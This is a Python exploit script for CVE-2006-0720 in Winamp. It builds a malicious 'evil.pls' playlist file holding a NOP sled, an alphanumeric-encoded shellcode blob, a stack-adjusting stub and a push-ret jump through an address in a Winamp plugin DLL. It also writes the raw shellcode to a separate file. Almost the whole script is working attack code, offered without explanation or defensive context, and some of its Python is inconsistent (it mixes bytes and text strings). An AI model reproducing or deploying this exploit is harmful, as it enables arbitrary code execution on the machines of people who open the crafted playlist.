#!/usr/bin/python -w
# CVE 2006-0720 winamp exploit
# push ret style


from struct import pack

filename="evil.pls"

# bad chars = 0a; 0c; 0d;  0f
buf =  b"\x90\x90"
buf += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x79\x6c\x4a\x48\x6c\x42\x63\x30\x65\x50\x47\x70\x33"
buf += b"\x50\x4e\x69\x6a\x45\x50\x31\x79\x50\x42\x44\x4c\x4b"
buf += b"\x56\x30\x70\x30\x4c\x4b\x76\x32\x74\x4c\x6c\x4b\x36"
buf += b"\x32\x57\x64\x6c\x4b\x54\x32\x61\x38\x34\x4f\x78\x37"
buf += b"\x51\x5a\x77\x56\x50\x31\x59\x6f\x6e\x4c\x77\x4c\x31"
buf += b"\x71\x51\x6c\x64\x42\x46\x4c\x51\x30\x79\x51\x6a\x6f"
buf += b"\x64\x4d\x63\x31\x4b\x77\x39\x72\x4c\x32\x52\x72\x51"
buf += b"\x47\x6e\x6b\x63\x62\x66\x70\x6c\x4b\x31\x5a\x67\x4c"
buf += b"\x4c\x4b\x42\x6c\x44\x51\x64\x38\x6d\x33\x70\x48\x43"
buf += b"\x31\x4b\x61\x36\x31\x4e\x6b\x62\x79\x45\x70\x35\x51"
buf += b"\x49\x43\x6e\x6b\x53\x79\x67\x68\x6d\x33\x54\x7a\x71"
buf += b"\x59\x6c\x4b\x45\x64\x4c\x4b\x36\x61\x6a\x76\x34\x71"
buf += b"\x49\x6f\x4e\x4c\x7a\x61\x6a\x6f\x36\x6d\x77\x71\x5a"
buf += b"\x67\x36\x58\x39\x70\x44\x35\x69\x66\x56\x63\x51\x6d"
buf += b"\x68\x78\x55\x6b\x43\x4d\x77\x54\x42\x55\x39\x74\x46"
buf += b"\x38\x4c\x4b\x72\x78\x77\x54\x35\x51\x58\x53\x61\x76"
buf += b"\x4e\x6b\x46\x6c\x50\x4b\x4c\x4b\x32\x78\x47\x6c\x33"
buf += b"\x31\x78\x53\x4e\x6b\x47\x74\x4e\x6b\x43\x31\x78\x50"
buf += b"\x6d\x59\x37\x34\x35\x74\x36\x44\x43\x6b\x43\x6b\x73"
buf += b"\x51\x70\x59\x31\x4a\x66\x31\x49\x6f\x6b\x50\x53\x6f"
buf += b"\x31\x4f\x33\x6a\x6e\x6b\x77\x62\x6a\x4b\x4c\x4d\x63"
buf += b"\x6d\x71\x78\x50\x33\x64\x72\x77\x70\x55\x50\x30\x68"
buf += b"\x61\x67\x30\x73\x46\x52\x33\x6f\x56\x34\x62\x48\x62"
buf += b"\x6c\x74\x37\x61\x36\x34\x47\x6e\x69\x6a\x48\x39\x6f"
buf += b"\x4e\x30\x48\x38\x4e\x70\x63\x31\x65\x50\x67\x70\x36"
buf += b"\x49\x6f\x34\x61\x44\x62\x70\x72\x48\x64\x69\x6d\x50"
buf += b"\x42\x4b\x37\x70\x59\x6f\x4b\x65\x71\x7a\x47\x7a\x53"
buf += b"\x58\x59\x50\x4f\x58\x52\x44\x57\x54\x50\x68\x65\x52"
buf += b"\x75\x50\x36\x71\x51\x4c\x6f\x79\x7a\x46\x56\x30\x56"
buf += b"\x30\x72\x70\x66\x30\x47\x30\x30\x50\x77\x30\x36\x30"
buf += b"\x62\x48\x5a\x4a\x74\x4f\x79\x4f\x6d\x30\x39\x6f\x6a"
buf += b"\x75\x4f\x67\x52\x4a\x62\x30\x73\x66\x72\x77\x55\x38"
buf += b"\x4c\x59\x6e\x45\x30\x74\x70\x61\x79\x6f\x7a\x75\x6d"
buf += b"\x55\x39\x50\x31\x64\x67\x7a\x79\x6f\x32\x6e\x55\x58"
buf += b"\x73\x45\x5a\x4c\x39\x78\x75\x37\x65\x50\x53\x30\x45"
buf += b"\x50\x50\x6a\x55\x50\x32\x4a\x67\x74\x71\x46\x56\x37"
buf += b"\x63\x58\x54\x42\x39\x49\x59\x58\x63\x6f\x39\x6f\x6a"
buf += b"\x75\x4f\x73\x6b\x48\x55\x50\x73\x4e\x64\x76\x6e\x6b"
buf += b"\x50\x36\x71\x7a\x43\x70\x75\x38\x35\x50\x56\x70\x73"
buf += b"\x30\x33\x30\x66\x36\x72\x4a\x73\x30\x30\x68\x70\x58"
buf += b"\x6f\x54\x42\x73\x6b\x55\x4b\x4f\x38\x55\x4c\x53\x73"
buf += b"\x63\x70\x6a\x57\x70\x53\x66\x42\x73\x70\x57\x33\x58"
buf += b"\x75\x52\x38\x59\x7a\x68\x71\x4f\x39\x6f\x6b\x65\x4b"
buf += b"\x33\x58\x78\x45\x50\x53\x4d\x61\x38\x66\x38\x31\x78"
buf += b"\x57\x70\x37\x30\x73\x30\x77\x70\x63\x5a\x47\x70\x50"
buf += b"\x50\x62\x48\x64\x4b\x54\x6f\x44\x4f\x44\x70\x4b\x4f"
buf += b"\x49\x45\x32\x77\x71\x78\x51\x65\x30\x6e\x42\x6d\x53"
buf += b"\x51\x4b\x4f\x68\x55\x61\x4e\x33\x6e\x79\x6f\x66\x6c"
buf += b"\x47\x54\x66\x6f\x6d\x55\x62\x50\x79\x6f\x4b\x4f\x59"
buf += b"\x6f\x7a\x49\x4f\x6b\x79\x6f\x6b\x4f\x6b\x4f\x65\x51"
buf += b"\x5a\x63\x71\x39\x4b\x76\x50\x75\x79\x51\x68\x43\x6d"
buf += b"\x6b\x68\x70\x4f\x45\x6e\x42\x50\x56\x52\x4a\x77\x70"
buf += b"\x33\x63\x49\x6f\x39\x45\x41\x41\xcc"



file2 = open("shellcode.bin", "w")
file2.write(buf)
file2.close()

start = "[playlist]\r\rFile1=\\\\"
#nop = "\x90"*856
nop = "\x90"*100 + buf + "\x90"*(756-len(buf))

# mov eax, esp; sub ax, 0x39c;  
shellcode = "\xcc"*2 + "\x89\xe0\x66\x2D\x9C\x03\x89\xc4\xE9\xff\xfc\xFF\xFF"  + "\xcc"*(164-13)  
print("Payload length is ", len(buf))
print("shellcode length is ", len(shellcode))
print("nop length is ", len(nop))
# shellcode difference of 0xa8 less

# Found sequences (All Modules), item 30
#  Address=046B647B
#  Disassembly=PUSH ESP
#  Module Name=C:\Program Files\Winamp\Plugins\ml_xpdxs.dll
push_ret = pack('i', 0x6660505e )
jmp = push_ret + "\xE9\x53\xFF\xFF\xFF" + "\x90"*(12-5)
end= "\r\nTitle1=pwnd\r\nLength1=5`1\r\nNumberOfEntries=1\r\nVersions=2\r\n";

buffer = start + nop + shellcode + jmp + end

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
